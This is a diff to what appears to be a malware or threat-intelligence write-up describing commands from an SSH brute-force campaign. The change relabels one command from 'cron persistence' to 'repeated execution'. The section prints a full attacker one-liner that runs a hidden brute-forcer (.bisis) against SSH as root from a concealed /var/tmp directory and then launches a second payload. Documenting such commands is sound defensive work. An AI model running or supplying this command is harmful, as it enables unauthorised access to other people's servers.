@@ -22,15 +22,14 @@ Uses a timeout of 8 seconds per connection attempt and references an external co
 
 ---
 
-## 🧩 .bisis Cron Persistence Command
-(id: `bisis-cron-command`)
+## 🧩 .bisis Repeated Execution Command
+(id: `bisis-repeated-execution-command`)
 
 ```bash
 bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulimit -n 999999 ; cat iplist | ./bisis -f 20 -t 8 -T 20 -S 10 -p 22 -l root -o /var/tmp/.update-logs/.history -O /var/tmp/.update-logs/.history -i eth0 -d /var/tmp/.update-logs/iplist2 ; ./x"
 ```
 
 **Description:**  
-Establishes persistence by scheduling `.bisis` brute-force execution via cron.  
 Launches `.bisis` with customized parameters (threads, timeout, SSH port, username) and starts a second payload (`x`) after brute-forcing.
 
 ---
